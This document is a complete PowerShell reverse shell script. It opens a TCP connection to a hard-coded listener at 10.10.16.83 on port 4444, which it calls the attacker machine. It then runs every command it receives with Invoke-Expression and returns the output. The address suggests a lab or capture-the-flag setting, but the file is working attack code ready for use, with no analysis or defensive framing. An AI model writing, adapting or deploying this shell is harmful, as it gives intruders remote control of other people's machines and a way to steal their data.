# Replace <IP> and <PORT> with your listener IP and port
$IP = "10.10.16.83"
$Port = "4444"

# Create TCP client and connect to the attacker machine
try {
    $Client = New-Object System.Net.Sockets.TcpClient($IP, $Port)
    $Stream = $Client.GetStream()
    $Writer = New-Object System.IO.StreamWriter($Stream)
    $Reader = New-Object System.IO.StreamReader($Stream)
    
    # Function to send data to the attacker
    function SendData {
        param([string]$data)
        $Writer.WriteLine($data)
        $Writer.Flush()
    }

    # Function to receive data from the attacker
    function ReceiveData {
        $Received = $Reader.ReadLine()
        return $Received
    }

    # Send initial PS > prompt
    SendData "PS > "
    
    # Start interactive shell loop
    while ($Client.Connected) {
        try {
            # Receive command from the attacker
            $Prompt = ReceiveData
            if ($Prompt -eq $null) { break }
            
            # Execute received command and send output back to attacker
            $Output = Invoke-Expression $Prompt 2>&1 | Out-String
            SendData $Output
            
            # Send PS > prompt again
            SendData "PS > "
        } catch {
            SendData $_.Exception.Message
        }
    }
    
    # Close streams and client on exit
    $Reader.Close()
    $Writer.Close()
    $Stream.Close()
    $Client.Close()
} catch {
    Write-Host "Error: $_"
}
